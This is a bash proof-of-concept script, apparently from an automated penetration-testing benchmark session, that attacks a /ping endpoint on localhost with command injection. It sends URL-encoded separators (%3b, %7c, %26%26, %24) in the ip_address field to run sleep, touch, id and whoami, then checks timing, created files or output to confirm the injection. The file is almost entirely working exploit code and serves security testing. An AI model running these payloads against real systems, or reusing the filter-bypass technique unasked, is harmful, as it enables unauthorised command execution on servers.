#!/bin/bash
# POC: Demonstrates command injection bypass through URL-encoded command separators. Shows how %3b (;), %7c (|), %26%26 (&&) bypass naive input filters.
# Target: ./repo
# Created: 2025-11-10T15:08:56.321Z
# Session: benchmark-XBEN-037-24-mht9nqa0

# URL Encoding Bypass - Command Injection POC
# This POC demonstrates how URL-encoded command separators bypass naive input filters
# Target: /ping endpoint on localhost

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-5000}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}/ping"

echo "[*] URL Encoding Bypass - Command Injection POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: URL-encoded semicolon with sleep command
echo "[TEST 1] URL-encoded semicolon (%3b) with sleep command"
echo "Payload: 127.0.0.1%3bsleep%205"
echo "Expected: Response delayed by ~5 seconds due to command execution"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "ip_address=127.0.0.1%3bsleep%205" 2>&1)
END_TIME=$(date +%s%N)
ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
echo "Response time: ${ELAPSED_MS}ms"
if [ $ELAPSED_MS -ge 5000 ]; then
    echo "[✓] VULNERABLE: Delayed response confirms URL-decoded command execution"
else
    echo "[✗] NOT VULNERABLE: Response returned too quickly"
fi
echo ""

# Test 2: URL-encoded semicolon with file creation
echo "[TEST 2] URL-encoded semicolon (%3b) with file creation"
echo "Payload: 127.0.0.1%3btouch%20/tmp/url_encoded_test_$RANDOM.txt"
TESTFILE="/tmp/url_encoded_test_$RANDOM.txt"
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "ip_address=127.0.0.1%3btouch%20${TESTFILE//\//%2F}" 2>&1)
sleep 1
if [ -f "$TESTFILE" ]; then
    echo "[✓] VULNERABLE: File created via URL-encoded command injection"
    rm -f "$TESTFILE"
else
    echo "[✗] NOT VULNERABLE: File not created"
fi
echo ""

# Test 3: URL-encoded pipe (%7c) for command chaining
echo "[TEST 3] URL-encoded pipe (%7c) for command chaining"
echo "Payload: 127.0.0.1%7cid%20%3e%20/tmp/url_pipe_test.txt"
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "ip_address=127.0.0.1%7cid" 2>&1)
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "uid="; then
    echo "[✓] VULNERABLE: Piped command executed"
else
    echo "[-] Could not confirm pipe execution from response"
fi
echo ""

# Test 4: URL-encoded logical AND (%26%26) 
echo "[TEST 4] URL-encoded logical AND (%26%26)"
echo "Payload: 127.0.0.1%26%26touch%20/tmp/url_and_test.txt"
TESTFILE2="/tmp/url_and_test_$RANDOM.txt"
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "ip_address=127.0.0.1%26%26touch%20${TESTFILE2//\//%2F}" 2>&1)
sleep 1
if [ -f "$TESTFILE2" ]; then
    echo "[✓] VULNERABLE: Logical AND operator works with URL encoding"
    rm -f "$TESTFILE2"
else
    echo "[✗] NOT VULNERABLE: Logical AND did not execute"
fi
echo ""

# Test 5: URL-encoded dollar sign for command substitution (%24)
echo "[TEST 5] URL-encoded dollar sign (%24) for command substitution"
echo "Payload: 127.0.0.1%24(whoami)"
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "ip_address=127.0.0.1%24(whoami)" 2>&1)
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -qE "[a-z]+|root"; then
    echo "[✓] VULNERABLE: Dollar sign command substitution works"
else
    echo "[-] Could not confirm dollar substitution from response"
fi
echo ""

echo "[*] POC Complete"